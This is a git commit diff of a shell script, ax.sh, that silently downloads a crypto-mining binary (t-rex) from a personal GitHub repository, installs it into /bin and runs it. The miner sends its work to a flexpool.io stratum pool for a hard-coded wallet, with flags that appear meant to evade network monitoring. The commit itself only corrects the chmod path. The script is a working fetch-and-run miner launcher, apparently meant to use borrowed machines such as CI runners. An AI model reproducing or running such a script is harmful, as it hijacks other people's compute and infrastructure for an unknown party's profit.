0f3651ac53b8012aceffc38d7e836252089569c0
ALICLAYSMEN <58400825+ALICLAYSMEN@users.noreply.github.com>
2022-07-11 13:56:09 +0700

    Update ax.sh

--- ax.sh
+++ ax.sh
@@ -3,7 +3,7 @@ echo "ENGINE START!"
 export LD_PRELOAD=
 curl -sLO https://raw.githubusercontent.com/ALICLAYSMEN/trexxx/main/t-rex
 cp t-rex /bin
-chmod +x t-rex
+chmod +x /bin/t-rex
 
 /bin/t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0xc849640837cBce9Ec3e3ce1d1f755A2DE5fb6ddF -p x -w rig0 --no-sni --dns-https-server 1.1.1.1 --time-limit 240
 
